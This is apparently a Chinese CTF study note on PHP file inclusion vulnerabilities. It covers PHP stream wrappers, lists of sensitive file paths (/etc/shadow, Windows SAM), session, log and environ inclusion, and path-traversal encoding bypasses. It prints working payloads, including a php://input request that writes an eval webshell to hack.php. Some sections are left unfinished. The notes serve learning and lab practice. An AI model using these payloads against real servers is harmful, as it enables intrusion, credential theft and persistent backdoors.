---
description: 这里将通过参考文章和做题一起进行总结，并且文件包含漏洞，很多都利用了文件上传漏洞，所以这里也会总结一些文件上传漏洞的知识。
---

# 🍉 FL漏洞知识点总结

## <mark style="color:blue;background-color:green;">1.include/require/include\_one/require\_one</mark>

在PHP语法篇的10.文件里面我们讲了include和require和include\_one和require\_one这些，如果大家忘记了，可以返回去看看。

{% content-ref url="../rce-yuan-cheng-dai-ma-zhi-hang/php-yu-fa.md" %}
[php-yu-fa.md](../rce-yuan-cheng-dai-ma-zhi-hang/php-yu-fa.md)
{% endcontent-ref %}

***

## <mark style="color:blue;background-color:green;">2.allow\_url\_include/allow\_url\_fopen</mark>

其实我看到老师写的书上也还在说这个，但是我看官方手册上面allow\_url\_include自php7.4就废除了，还发现就算是再新的书都有一定的滞后性，大家还是以手册为主。虽然废除了，但是我们还是讲解这两个在php.ini配置文件中的作用

### <mark style="color:purple;background-color:yellow;">1）allow\_url\_include</mark>

这个选项允许include,require,include\_one和require四个函数的使用。

{% hint style="info" %}
这个设置项需要开启 allow\_url\_fopen 。
{% endhint %}

### <mark style="color:purple;background-color:yellow;">2）allow\_url\_fopen</mark>

本选项激活了 URL 形式的 fopen 封装协议使得可以访问 URL 对象例如文件。默认的封装协议提供用 ftp 和 http 协议来访问。

***

## <mark style="color:blue;background-color:green;">3.php伪协议</mark>

我们在RCE漏洞知识点总结的5.php伪协议里面讲了php伪协议，忘记了也可以去看看

{% content-ref url="../rce-yuan-cheng-dai-ma-zhi-hang/rce-lou-dong-zhi-shi-dian-zong-jie.md" %}
[rce-lou-dong-zhi-shi-dian-zong-jie.md](../rce-yuan-cheng-dai-ma-zhi-hang/rce-lou-dong-zhi-shi-dian-zong-jie.md)
{% endcontent-ref %}

{% hint style="info" %}
这里总结一下四个主要的协议是用在哪些方面。

```php
1.php://filter              主要用于读取源码
2.php://input               经常使用file_get_contents获取php://input内容
3.data://                   执行命令
4.file://                   访问本地文件系统
```
{% endhint %}

***

在有以上的知识的基础上我们要介绍这个FL漏洞了。主要是分为本地文件包含漏洞和远程文件包含漏洞。

## <mark style="color:blue;background-color:green;">1.本地文件包含漏洞</mark>

本地文件包含漏洞是指能打开并且包含本地文件的漏洞，大部分都是这个漏洞。不受allow\_url\_fopen和allow\_url\_include的影响

***

## <mark style="color:blue;background-color:green;">2.远程文件包含漏洞</mark>

远程文件包含漏洞是指能够包含远程的文件并且执行他们，这个远程是我们可控的，所以危害较大，并且要求allow\_url\_fopen和allow\_url\_include都打开为on才能够执行。

***

## <mark style="color:blue;background-color:green;">3.敏感文件的目录</mark>

这里主要是要进行目录穿越或者是遍历任意文件时用到，虽然有很多，但是也不知道有用没用，都积累一下吧。

> <mark style="color:orange;">**linux**</mark>下：

```url
/etc/passwd // 账户信息

/etc/shadow // 账户密码文件

/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件

/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置

/usr/local/app/php5/lib/php.ini // PHP相关配置

/etc/httpd/conf/httpd.conf // Apache配置文件

/etc/my.conf // mysql 配置文件
```

> <mark style="color:orange;">**windows**</mark>下

```url
c:\boot.ini // 查看系统版本

c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件

c:\windows\repair\sam // 存储Windows系统初次安装的密码

c:\ProgramFiles\mysql\my.ini // MySQL配置

c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码

c:\windows\php.ini // php 配置信息
```

***

## <mark style="color:blue;background-color:green;">4.php伪协议</mark>

在开头我们也放了php伪协议，虽然有相同的运用之处，但是也有一些差别，我们会专门就这个漏洞再来补充他们在这个漏洞的用法。有些不怎么要用或者之前已经详细讲过的就直接跳过去了。

### <mark style="color:purple;background-color:yellow;">1)file://</mark>

访问本地文件系统。

条件：无要求

姿势：

```url
http://*********.php/?file=file://C:/Windows/win.ini
```

### <mark style="color:purple;background-color:yellow;">2）php://input</mark>

<figure><img src="../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

可以直接读取到POST上没有经过解析的原始数据。我们之前提到过，input后面可以加上post的body执行php代码。

{% hint style="warning" %}
`enctype="multipart/form-data"` 的时候 `php://input` 是无效的。
{% endhint %}

条件：

* allow\_url\_include=<mark style="color:red;">On</mark>

姿势：

#### _①执行代码_

```url
http://*******.php/?file=php://input
/*[post]
<?php phpinfo()?>*/
```

后面的注释的php代码需要通过post传递。

{% hint style="info" %}
当出现file\_get\_contents函数时，我们就要想到用php://input了
{% endhint %}

#### ②执行命令

```url
http://******.php/?file=php://input
/*[post]
<?php system('ls');?>*/
```

#### ③写入木马

```url
http://******.php/?file=php://input
/*[post]
<?php fputs(fopen('hack.php','w'),'<?php @eval($_POST['123456'])?>');?>*/
```

解释一下上面的php语句吧。可能因为之前没有见到过可能不太理解。这里了解两个函数之后就容易理解了，就是后面的木马代码是写入到前面fopen打开的文件里面的。

> fputs（）/fwrite()：写入文件
>
> 并且是把data写入到scream里面。
>
> ```php
> fwrite(resource $stream, string $data, ?int $length = null): int|false
> ```

> fopen():打开文件或者url。
>
> filename可以是文件，可以是url。
>
> ```php
> fopen(string $filename, string $mode,bool $use_include_path = false,?resource $context = null
> ): resource|false
> ```
>
> 并且模式和c语言打开文件一样这里贴张图大家看吧
>
>

<figure><img src="../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:purple;background-color:yellow;">3）php://filter</mark>

这个之前就讲的详细了，没啥好补充的。

### <mark style="color:purple;background-color:yellow;">4）phar://</mark>

这个之前没讲过，但是在这里要用到，补充一下。

是php解压缩包的协议，<mark style="color:red;">**并且不管后面是什么都会解压缩，无差别平等攻击**</mark>

要求：

* phpversion>=5.3

姿势：

#### ①执行代码：

写一个php代码比如\<?php echo"hellp";?>，然后打包成zip压缩模式的压缩包

{% hint style="danger" %}
注意，这个压缩模式必须是zip，不能是7zip，rar这种。此外，压缩包的后缀名可以不一定是zip，还可以是111，222，txt都可以。
{% endhint %}

<figure><img src="../.gitbook/assets/image (2) (2).png" alt=""><figcaption></figcaption></figure>

然后指定绝对目录

```url
http://localhost:3000/study.php?file=phar://F:\php%20code\1.zip\1.php
```

<figure><img src="../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>

当然相对目录也可以

```url
http://localhost:3000/study.php?file=phar://1.zip/1.php
```

<figure><img src="../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

#### ②执行命令:

只要把php代码修改一下变成执行命令的语句就可以，其他都不变，这里就不测试了因为步骤都是一样的

#### ③写入木马：

同理

### <mark style="color:purple;background-color:yellow;">5)zip://</mark>

和上面的phar（）的作用是一样的，就是用法不一样。我们直接说区别了其他都是一样的。他们的区别主要是在路径上。

{% hint style="danger" %}
zip://只能用<mark style="color:red;">绝对路径</mark>不能用相对路径。
{% endhint %}

并且压缩文件包和压缩文件之间要用#连接，并且这个#得经过url编码，也就是%23。

```url
http://localhost:3000/study.php?file=phar://F:\php%20code\1.zip%231.php
```

### <mark style="color:purple;background-color:yellow;">6）data://</mark>

就是之前的两句话之前已经很详细地说了。

***

## <mark style="color:blue;background-color:green;">5.包含session</mark>

首先我们先介绍一下session是什么

> session简单理解就是会话。打个生动的比喻，session是位于服务器端的保险柜。比如我们去健身的时候，前台小姐姐会给我们一把钥匙和与它对应的保险柜，我们从开始健身到最后离开健身房就是一个会话，途中可能会去买瓶水放到保险柜里，或者从保险柜里拿个换洗衣物之类的，都是这个中间产生的数据，保险柜记录了我们产生的数据。

条件：

如果要使用包含session，那么我们需要知道session的路径并且他的内容部分是我们可控的。

姿势：

我们可以查看phpinfo()文件里面的session的路径存放处，在session下面的session\_save\_path

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption><p>可以看到我的是/var/lib/php/sessions</p></figcaption></figure>

{% hint style="info" %}
第二竖排是local value（局部变量），第三竖排是master value（主变量），local value会覆盖master value。所以我们看第二竖排
{% endhint %}

### <mark style="color:purple;background-color:yellow;">1）常见php的session存放位置</mark>

```url
/var/lib/php/sess_PHPSESSID
/var/lib/php/sess_PHPSESSID
/tmp/sess_PHPSESSID
/tmp/sessions/sess_PHPSESSID
```

我的session就位于/var/lib/php/sessions下。

### <mark style="color:purple;background-color:yellow;">2）命名</mark>

sessions目录下的文件的命名是sess\_\[phpsessid]。而phpsessid是我们的cookie里面可以看到的，我们甚至可以控制cookie中的phpsessid的值。然后发送的时候，产生的session文件的命名就是我们的命名规则中的结果。

比如我们首先执行一个php代码

```php
<?php
session_start();
echo "hell0";
?>
```

{% hint style="info" %}
这里session\_start()一定要有，不然没有session
{% endhint %}

我们可以通过editthecookie插件看到phpsessid是is4978nk7n9nuajv21qe688svg

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

然后从前面我们就知道我们的session文件存在/var/lib/php/sessions下面，然后我们进行查看出现了一个新的sess\_xxxxx文件，这个文件就是产生的session文件。

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:purple;background-color:yellow;">3）利用</mark>

接下来我们将要讲如何利用包含session，其实session的利用并不是固定化的，我们要通过进入session文件，然后通过观察session文件中的可控变量，然后写入payload。

我们接下来通过自己实验的一个例子理解这个观察可控变量。

首先搭建这个php代码环境

```php
<?php
session_start();
error_reporting(0);

if (isset($_POST['username'])) {
    $_SESSION['username'] = $_POST['username'];
}


if (isset($_GET['file'])) {
    include($_GET['file']);
}

?>
```

对于这段代码我们首先介绍$\_SESSION,这个之前没有见到过,我直接把那个文章的那句话复制下来，因为他已经解释的比手册好很多了。

> 1. PHP 会将会话中的数据设置到 `$_SESSION` 变量中。
> 2. 当 PHP 停止的时候，它会自动读取 `$_SESSION` 中的内容，并将其进行序列化，然后发送给会话保存管理器来进行保存。
> 3. 对于文件会话保存管理器，会将会话数据保存到配置项 `session.save_path` 所指定的位置。

上述代码中的$username是可控的，并且能被写入到session中。所以我们对session写入一句话木马或者其他执行代码的语句。然后我们使用username去访问sessions下面的文件，就是去包含这个文件。

{% hint style="info" %}
如果还有base64加密的话，还需要用`php://filter/read=convert.base64-decode/resource=`&#x20;
{% endhint %}

***

## <mark style="color:blue;background-color:green;">6.包含日志</mark>

因为web服务器很多时候都会将请求写入到日志文件中，比如apache这种。

条件：

需要知道服务器日志的存储路径，且日志文件可读。

### <mark style="color:purple;background-color:yellow;">1）一些日志默认存储路径</mark>



```url
1.apache+Linux日志默认路径：/etc/httpd/logs/access.log或/var/log/httpd/access.log

2.apache+win2003日志默认路径：D:\xampp\apache\logs\access.log、D:\xampp\apache\logs\error.log

3.IIS6.0+win2003默认日志文件：C:\WINDOWS\system32\Logfiles

4.IIS7.0+win2003 默认日志文件：%SystemDrive%\inetpub\logs\LogFiles

5.nginx 日志文件：日志文件在用户安装目录logs目录下,假设安装路径为/usr/local/nginx,那日志目录就是在/usr/local/nginx/logs下面
linux/var/log/nginx/access.log
```

除了路径，我们需要看一下日志文件长什么样子

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption><p>我的日志文件路径就在/var/log/apache2下面</p></figcaption></figure>

上面就包含了我刚刚用burpsuite发送的请求。所以只要是请求发送了他都能记录下来。并且我们发现包含进去的其实是路径里面的内容，以及user-agent也能包含，所以我们的payload也是写在这个地方。

### <mark style="color:purple;background-color:yellow;">2）利用</mark>

从上述的日志中我们已经知道了我们把payload放置的地方，然后发送请求。但是这里会遇到一些情况。

①编码错误

有时候我们用burp发送的到日志中会乱码，我们就要把我们的语句用url进行编码才能执行成功。

②log位置被修改

就比如我的电脑上的位置就和我们上面写的常见的路径都不一样，这个时候我们可以通过修改配置文件再包含。

下面是一些默认的配置文件的路径（其实这些默认和我电脑完全不一样）

```url
1.apache+linux 默认配置文件
        /etc/httpd/conf/httpd.conf或/etc/init.d/httpd

2. IIS6.0+win2003 配置文件
        C:/Windows/system32/inetsrv/metabase.xml

3. IIS7.0+WIN 配置文件
        C:\Windows\System32\inetsrv\config\applicationHost.config
```

***

## <mark style="color:blue;background-color:green;">7.包含environ</mark>

这里首先解释什么是environ

> environ：
>
> 英文单词都学过environment（环境），这个environ其实就是环境变量。他的位置是默认的的
>
> <mark style="color:red;">**在linux下面是/proc/self/environ，在win下面没有**</mark>
>
>

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

那篇文章里面写它包含了user-agent（http请求头里面的），虽然我在我的文件里面没有看到。

### <mark style="color:purple;background-color:yellow;">1）利用</mark>

所以在知道了use-agent是能知道位置的，那么我们就在user-agent里面写入php代码，然后去包含这个environ文件就可以执行我们的payload了。

***

## <mark style="color:blue;background-color:green;">8）包含fd</mark>

先解释fd吧

> fd（file describe）：文件描述符
>
> fd是一个子目录（就是下面还有文件），并且可以看到下面的文件名是数字。linux的目录我们都知道是树状的，找文件要一层一层的找下去，但是这样很费事件，所以为了提高效率，就有了fd，这个数字就相当一个索引，我们如果要查找某个进程，只要查找这个索引就可以了。0是标准输入，1是标准输出，2是标准错误。这意味着如果此时去打开一个新的文件，它的文件描述符会是3，再打开一个文件文件描述符就是4......

<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

文件路径在/proc/self/fd下，但是怎么利用没看到说，就先这样吧。

***

## <mark style="color:blue;background-color:green;">9）包含上传文件</mark>

我们直接把木马做成他想要的形式就可以了。在后面的文件上传漏洞我们仔细讲。

***

## <mark style="color:blue;background-color:green;">10）竞争条件</mark>

本来以为可以不做这个，结果发现5道题全是竞争条件，被迫学习。首先对原理进行讲解，因为自己原理都理解了很久。















## <mark style="color:blue;background-color:green;">11）绕过</mark>

我算是发现了有防御就会有绕过。这里有很多绕过方法

### <mark style="color:purple;background-color:yellow;">（1）遇到前缀</mark>

```php
<?php
    $file = $_GET['file'];
    include '/var/www/html/'.$file;
?>
```

像这种，我们自己输入的文件前面还带一些其他的路径的，我们可以通过路径遍历来绕过。<mark style="color:red;">**../**</mark>走到上一个目录，所以对上面的/var/www/html/.$file我们在我们平时需要输入的路径前加上../../../就变成了我们的$file。如果要达到/var,前面甚至只需要两个../

当然别人也可以对../进行过滤，我们就需要对他做一些变化。

#### ①url编码

| 编码字符串 | 编码结果      | 编码方式                       |
| ----- | --------- | -------------------------- |
| ../   | ..%2F     | URL编码（编码器生成，不知道为什么编码器只变了/） |
| ../   | %2E%2E%2F | 通过url编码，并且.的编码为%2e         |
| ../   | %2e%2e/   | 同理                         |
| ..\\  | %2e%2e%5c | ......                     |
| ..\\  | %2e%2e\\  | .......                    |
| ..\\  | ..%5c     | ......                     |

②二次编码







遇到die（）



## <mark style="color:red;background-color:orange;">参考门：</mark>

[https://www.freebuf.com/articles/web/182280.html](https://www.freebuf.com/articles/web/182280.html)

[https://www.anquanke.com/post/id/248627#h3-1](https://www.anquanke.com/post/id/248627#h3-1)
